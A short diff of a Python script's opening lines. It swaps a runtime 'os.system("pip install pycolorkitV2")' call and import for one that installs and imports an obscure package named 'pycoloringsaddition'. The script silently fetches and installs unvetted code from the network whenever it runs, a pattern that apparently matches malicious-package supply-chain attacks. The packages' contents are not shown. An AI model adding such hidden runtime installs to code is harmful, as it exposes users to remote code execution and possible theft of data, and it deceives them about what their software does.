@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycolorkitV2")
-import pycolorkitV2
+os.system("pip install pycoloringsaddition")
+import pycoloringsaddition
 import random
 import requests
 import time
